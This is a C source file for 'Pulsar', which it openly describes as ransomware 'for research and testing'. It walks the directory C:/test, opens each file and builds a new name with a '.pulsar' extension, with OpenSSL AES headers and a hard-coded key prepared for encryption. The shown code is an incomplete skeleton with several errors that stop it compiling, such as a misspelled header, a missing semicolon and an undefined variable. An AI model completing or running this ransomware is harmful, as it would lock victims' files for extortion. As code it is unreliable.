  
/*
* Copyright (c) 2020 Timo Sarkar
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to
* deal in the Software without restriction, including without limitation the
* rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
* sell copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in
* all copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
* FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
* IN THE SOFTWARE.
*
* I AM NOT RESPONSIBLE FOR ANY KIND OF DAMAGE BY USING THIS FILE. PLEASE USE PULSAR
* AS A RESEARCH AND TESTING MALWARE. THE PULSAR DISTRIBUTION IS NOT INTENDED FOR 
* ANY MALICIOUS PUPOSES. ITS ALL TESTING.
*/

#include <erno.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

#define AND & 
#define XOR ^
#define NOT !
// define some global vars for xor encryptions

int i = 0;
FILE *buffer;
FILE *ciphered;
FILE *readme;
float sharedkey[10] = { 0.65, 100, 0.365, 0, 25.9, 999, 5, 12.58, 7.0214, 103.126 };
// declare decryptions key
float precalculated;
// declare needed vars

char path[] = { "C:/test" }; // define the test path

struct data_chars {
    char current_char;
    char ciphered_char;
    char pre_ciphered_char;
} data; // some structed vars needed vor the ciphering process

struct cipher_attrib {
    int password; // initialize a new int named password
    char file[ 500 ];
    char c_file[ 500 ];
    char readmsg[ 500 ];
} c_attrib // define structs and assign them to c_attrib

int main( void ) { // start the main function
    DIR *dirp; // directory process
    struct dirent *direntp;
    c_attrib.password = 900; // c_atrrib & password multi-assign

    dirp = opendir( path ); // assign the "open the path from encrypt.c file" to dirp
    if ( dirp == NULL ) { // check if path to be opened is not defined
        fprintf( stderr, "ERR: Unable to open directory\n", perror ); // shout the error to user :)
        exit( EXIT_FAILURE ); // exit
    }

    while ( ( direntp = readdir( dirp ) ) != NULL ) { // check if opened dir is not equal to null
        fprintf( stdout, "Identifying archive %s\n", dirent -> d_name ); // print shortlog
        strcpy( c_attrib.file, path ); // copy path
        strcat( c_attrib.file, "/" ); // copy root
        strcat( c_attrib.file, direntp -> d_name ); // double assing file to d_name
        strcpy( c_attrib.c_file, path ); // same for source files of this project
        strcat( c_attrib.c_file, "/" ); // same here

        if ( ( strcmp( direntp -> d_name, "." ) != 0 ) && ( strcmp( direntp -> d_name, ".." ) == 0) ) { // folder path
            fprintf( stderr, "Hovering archive %s", c_attrib.file ); // show shortlog
        } else if ( ( strcmp( direntp -> d_name, "." ) != 0) && ( strcmp( direntp -> d_name, ".." ) != 0 ) ) { // check if folder path isnt equal to 0
            buffer = fopen( c_attrib.file, "r" ); // open file in buffer-mode
            if ( buffer == NULL ) {
                fputs( "ERR: opening file: File seems not to exist !", stderr );
                exit( EXIT_FAILURE ); // exit
            }

            strcat( c_attrib.file, direntp -> d_name );
            strcat( c_attrib.file, ".pulsar" ); // define .pulsar enc fileformat
        }
    }
} 
